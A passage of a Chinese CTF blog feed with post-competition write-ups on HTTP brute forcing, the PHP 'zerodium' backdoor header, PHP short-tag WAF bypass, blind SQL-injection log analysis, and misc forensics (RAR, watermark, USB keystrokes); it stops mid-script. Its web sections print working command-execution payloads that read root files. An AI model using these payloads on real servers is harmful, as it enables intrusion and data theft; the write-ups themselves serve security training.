src="https://img-blog.csdnimg.cn/20210329193459133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在Payload Options模块中点击load添加字典，在Payload Processing模块中点击添加选择Add prefix，其值为<code>admin:</code>,继续选择encode，其值为base64-encode，最后点击Start attck开始爆破<br><img src="https://img-blog.csdnimg.cn/20210329194328455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆破结果按Length排序，发现值为<code>YWRtaW46MTIzMzIx</code>，此时状态码为200，说明是正确的账号密码。<br><img src="https://img-blog.csdnimg.cn/20210329194425899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>base64解密得到<code>admin:123321</code>,输入账号密码登陆得到flag，在响应头也能看到flag<br><img src="https://img-blog.csdnimg.cn/20210329194850620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="响应包源代码"><a href="#响应包源代码" class="headerlink" title="响应包源代码"></a>响应包源代码</h2><p>HTTP响应包源代码查看</p><p>访问题目地址<br><img src="https://img-blog.csdnimg.cn/20210329195659368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>抓包，发包，在响应包源码发现了flag。<br><img src="https://img-blog.csdnimg.cn/20210329195714758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接查看源代码也可以发现flag<br><img src="https://img-blog.csdnimg.cn/20210329195946922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>参考:<br><a href="https://baike.baidu.com/item/http/243074?fromtitle=HTTP">百度百科-HTTP协议</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：深入学习HTTP协议&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="协议基础" scheme="http://atkx.top/tags/%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>虎符+红明谷+ctfshow渔人杯赛后复现</title>
    <link href="http://atkx.top/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://atkx.top/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-04-05T13:40:02.000Z</published>
    <updated>2021-05-06T10:32:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：记录最近几场比赛的赛后复现</p> <a id="more"></a><h1 id="虎符CTF"><a href="#虎符CTF" class="headerlink" title="虎符CTF"></a>虎符CTF</h1><h2 id="Web-签到"><a href="#Web-签到" class="headerlink" title="Web-签到"></a>Web-签到</h2><p><img src="https://img-blog.csdnimg.cn/20210404100847899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>参考<a href="http://cn-sec.com/archives/313267.html">详细分析PHP源代码后门事件及其供应链安全启示</a></p><p>根据文章提示，添加恶意请求头</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumphpinfo();<br></code></pre></td></tr></table></figure><p>可以看到phpinfo内容<br><img src="https://img-blog.csdnimg.cn/20210404100629750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续构造，查看根目录下的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumsystem(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404100940524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>读取flag文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumsystem(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404101127186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="MISC-你会日志分析吗"><a href="#MISC-你会日志分析吗" class="headerlink" title="MISC-你会日志分析吗"></a>MISC-你会日志分析吗</h2><p><img src="https://img-blog.csdnimg.cn/20210404101326722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>分析日志，该日志应该是用脚本进行布尔盲注，最后一步是爆flag的值，发现有两种长度的包，猜测长度377代表爆值成功，长度399代表失败<br><img src="https://img-blog.csdnimg.cn/20210404103342703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>列出长度为377的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">90 109 120 104 90 51 116 90 98 51 86 102 89 88 74 108 88 51 78 118 88 50 100 121 90 87 70 48 102 81 61 61<br></code></pre></td></tr></table></figure><p>使用脚本进行处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>a=[<span class="hljs-number">90</span>,<span class="hljs-number">109</span>,<span class="hljs-number">120</span>,<span class="hljs-number">104</span>,<span class="hljs-number">90</span>,<span class="hljs-number">51</span>,<span class="hljs-number">116</span>,<span class="hljs-number">90</span>,<span class="hljs-number">98</span>,<span class="hljs-number">51</span>,<span class="hljs-number">86</span>,<span class="hljs-number">102</span>,<span class="hljs-number">89</span>,<span class="hljs-number">88</span>,<span class="hljs-number">74</span>,<span class="hljs-number">108</span>,<span class="hljs-number">88</span>,<span class="hljs-number">51</span>,<span class="hljs-number">78</span>,<span class="hljs-number">118</span>,<span class="hljs-number">88</span>,<span class="hljs-number">50</span>,<span class="hljs-number">100</span>,<span class="hljs-number">121</span>,<span class="hljs-number">90</span>,<span class="hljs-number">87</span>,<span class="hljs-number">70</span>,<span class="hljs-number">48</span>,<span class="hljs-number">102</span>,<span class="hljs-number">81</span>,<span class="hljs-number">61</span>,<span class="hljs-number">61</span>]<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    flag=flag+<span class="hljs-built_in">chr</span>(i)<br>    <br>print(flag)<br>print(base64.b64decode(flag))<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==<br>b<span class="hljs-string">&#x27;flag&#123;You_are_so_great&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>一个一个找长度为377的包太麻烦了，附上大师傅的脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">from base64 import *<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>with open(<span class="hljs-string">&#x27;access.log&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) as f:<br>    lines = f.readlines()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;select%20flag%20from%20flllag&quot;</span> <span class="hljs-keyword">in</span> line:<br>            packet_len = line[line.find(<span class="hljs-string">&#x27; 200 &#x27;</span>)+5:line.find(<span class="hljs-string">&#x27; &quot;-&quot; &quot;python-requests/2.21.0&quot;&#x27;</span>)]<br>            <span class="hljs-keyword">if</span> packet_len == <span class="hljs-string">&#x27;377&#x27;</span>:<br>                ascii_code = line[line.find(<span class="hljs-string">&#x27;))=&#x27;</span>)+3:line.find(<span class="hljs-string">&#x27;,sleep&#x27;</span>)]<br>                ascii_str = chr(int(ascii_code))<br>                flag += ascii_str<br>            <span class="hljs-keyword">else</span>:<br>                pass<br>        <span class="hljs-keyword">else</span>:<br>            pass<br><br><span class="hljs-built_in">print</span>(b64decode(flag).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><h1 id="红明谷CTF"><a href="#红明谷CTF" class="headerlink" title="红明谷CTF"></a>红明谷CTF</h1><h2 id="Web-write-shell"><a href="#Web-write-shell" class="headerlink" title="Web-write_shell"></a>Web-write_shell</h2><p>没报上名，在BUU上面找到的环境<br><img src="https://img-blog.csdnimg.cn/20210405165110827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>知识点：短标签绕过php过滤</strong></p><blockquote><p>PHP开启短标签即short_open_tag=on时，可以使用<?=$_?>输出变量</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>))&#123;<br>        <span class="hljs-comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$input</span>))&#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$output</span>)&#123;<br>          <span class="hljs-variable">$input</span>[<span class="hljs-variable">$key</span>] = waf(<span class="hljs-variable">$output</span>);<br>      &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$input</span> = check(<span class="hljs-variable">$input</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$dir</span>))&#123;<br>    mkdir(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pwd&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;upload&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>        waf(<span class="hljs-variable">$data</span>);<br>        file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$dir</span>&quot;</span> . <span class="hljs-string">&quot;index.php&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>审计代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1、写入文件，但是对<span class="hljs-variable">$data</span>变量进行了过滤<br>2、使用&lt;?=?&gt; 短标签即可绕过php然后输出<br>3、用反引号直接执行命令<br>4、过滤了空格,用%09代替空格<br></code></pre></td></tr></table></figure><p>根据源码，先查看当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?action=<span class="hljs-built_in">pwd</span> <br><span class="hljs-comment">#sandbox/d99081fe929b750e0557f85e6499103f/</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404173216510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>尝试读取根目录下的所有文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?action=upload&amp;data=&lt;?=`cat%09/*`?&gt;<br></code></pre></td></tr></table></figure><p>最后访问<code>/sandbox/d99081fe929b750e0557f85e6499103f/</code>得到flag<br><img src="https://img-blog.csdnimg.cn/20210404173408667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="MISC-我的心是冰冰的"><a href="#MISC-我的心是冰冰的" class="headerlink" title="MISC-我的心是冰冰的"></a>MISC-我的心是冰冰的</h2><p>题目描述：似乎有信息被隐藏了。</p><p>打开rar压缩包文件受损，可能存在RAR伪加密，按照<a href="https://l1near.top/index.php/2021/03/15/97.html#comment-174">L1near师傅的博客</a>，将24字节处的84改为80即可<br><img src="https://img-blog.csdnimg.cn/20210404180245275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压压缩包得到<br><img src="https://img-blog.csdnimg.cn/20210404180359809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看wp发现是java盲水印</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar BlindWatermark.jar decode -c bingbing.jpg decode.jpg<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210408214553555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>得到口令<code>gnibgnib</code>，解压得到bingbing.pcapng流量包，发现数据是16位，所以是USB键盘流量<br><img src="https://img-blog.csdnimg.cn/20210404201547272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>tshark提取USB流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021040418495794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>剔除空行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185033903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用脚本加上冒号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)==<span class="hljs-number">16</span>: <span class="hljs-comment"># 键盘流量的话len改为16</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185301518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>通用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">mappings = &#123; <span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>,  <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>,  <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0A</span>:<span class="hljs-string">&quot;G&quot;</span>,  <span class="hljs-number">0x0B</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0C</span>:<span class="hljs-string">&quot;I&quot;</span>,  <span class="hljs-number">0x0D</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0E</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0F</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>,  <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1A</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1B</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1C</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1D</span>:<span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-number">0x1E</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1F</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>,  <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;[DEL]&quot;</span>,  <span class="hljs-number">0X2B</span>:<span class="hljs-string">&quot;    &quot;</span>, <span class="hljs-number">0x2C</span>:<span class="hljs-string">&quot; &quot;</span>,  <span class="hljs-number">0x2D</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-number">0x2E</span>:<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0x2F</span>:<span class="hljs-string">&quot;[&quot;</span>,  <span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,  <span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;&quot;</span>,  <span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&quot;</span>,  <span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&quot;</span> &#125;<br><br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span>:<br>         <span class="hljs-keyword">continue</span><br>    nums.append(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span 